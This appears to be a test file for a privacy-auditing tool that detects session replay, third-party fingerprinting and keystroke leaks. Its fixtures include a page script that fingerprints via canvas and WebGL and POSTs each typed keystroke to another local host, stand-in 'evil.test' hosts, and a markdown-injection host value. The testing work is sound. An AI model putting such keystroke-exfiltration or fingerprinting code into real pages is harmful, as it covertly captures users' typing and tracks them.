// Tracking behaviour: synthetic analysis, plus a real browser run proving the hooks record and the keystroke probe finds a leak to another host.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { launchBrowser } from '../scripts/launch.mjs';
import { analyzeBehaviors, renderBehaviorsMd, fingerprintHooks, collectBehaviors } from '../scripts/tracking-behaviors.mjs';

test('analysis: replay service, third-party fingerprint, keystroke leak; hostile values stay inert; error pages skipped', () => {
  const r = analyzeBehaviors([
    { url: 'https://shop.test/', status: 200, editing: { scripts: ['https://static.hotjar.com/c/hotjar-1.js'] }, behaviors: { fp: { canvas: [{ api: 'toDataURL', src: 'https://cdn.evil.test/fp.js' }], webgl: [{ src: 'https://shop.test/app.js' }], audio: [], measureText: 80, measureSrc: 'https://cdn.evil.test/fp.js' }, keystrokes: { tested: true, leaks: [{ host: 'logs.evil.test`\n# x', where: 'body' }] } } },
    { url: 'https://shop.test/gone', status: 404, editing: { scripts: ['https://clarity.ms/x.js'] } },
  ]);
  assert.deepEqual(r.replay.map((x) => x.name), ['Hotjar']);
  assert.ok(r.flags.replay && r.flags.fingerprintThirdParty && r.flags.keystrokeLeak);
  assert.equal(r.fingerprint.find((x) => x.kind === 'webgl').party, 'first-party');
  assert.ok(r.fingerprint.some((x) => x.kind === 'fonts'));
  const md = renderBehaviorsMd(r);
  assert.ok(md.includes('Hotjar') && !md.includes('Clarity'));
  assert.ok(!/`\n#/.test(md), 'no markdown injection from host');
});

test('nothing found on a quiet page', () => {
  const r = analyzeBehaviors([{ url: 'https://a.test/', status: 200, editing: { scripts: [] }, behaviors: { fp: { canvas: [], webgl: [], audio: [], measureText: 3 }, keystrokes: { tested: true, leaks: [] } } }]);
  assert.ok(!r.flags.replay && !r.flags.fingerprintThirdParty && !r.flags.keystrokeLeak);
  assert.ok(renderBehaviorsMd(r).includes('沒有看到它被送往其他網站') || renderBehaviorsMd(r).includes('not'));
});

test('browser: canvas+WebGL reads are recorded, typed text leaking to another host is found, password forms are not probed', async (t) => {
  let browser; try { browser = await launchBrowser(); } catch { t.skip('no browser'); return; }
  const seen = [];
  const other = http.createServer((req, res) => { let b = ''; req.on('data', (d) => (b += d)); req.on('end', () => { seen.push(req.url + b); res.setHeader('access-control-allow-origin', '*'); res.end('ok'); }); });
  await new Promise((r) => other.listen(0, '127.0.0.1', r));
  const op = other.address().port;
  const page1 = `<input id=q type=text><script>
    const c=document.createElement('canvas');c.width=200;c.height=50;const x=c.getContext('2d');x.fillText('probe',2,20);c.toDataURL();
    const g=document.createElement('canvas').getContext('webgl');if(g){g.getParameter(37446);}
    document.getElementById('q').addEventListener('input',e=>fetch('http://127.0.0.1:${op}/k',{method:'POST',body:e.target.value,mode:'no-cors'}));</script>`;
  const page2 = `<form><input type=text name=user><input type=password name=p></form>`;
  const web = http.createServer((req, res) => { res.setHeader('content-type', 'text/html'); res.end(req.url === '/pw' ? page2 : page1); });
  await new Promise((r) => web.listen(0, 'localhost', r));
  const wp = web.address().port;
  try {
    const ctx = await browser.newContext(); await ctx.addInitScript(fingerprintHooks);
    const p = await ctx.newPage(); await p.goto(`http://localhost:${wp}/`);
    const b = await collectBehaviors(p, {});
    assert.ok(b.fp.canvas.length >= 1, 'canvas read recorded');
    assert.ok(b.keystrokes.tested && b.keystrokes.leaks.some((l) => l.host === '127.0.0.1'), JSON.stringify(b.keystrokes));
    assert.ok(seen.some((s) => s.includes('seprobe')));
    assert.equal(await p.inputValue('#q'), '', 'probe text cleared');
    await p.goto(`http://localhost:${wp}/pw`);
    const b2 = await collectBehaviors(p, {});
    assert.equal(b2.keystrokes.tested, false);
    assert.equal((await collectBehaviors(p, { auth: true })).keystrokes.tested, false);
  } finally { await browser.close(); web.close(); other.close(); }
});
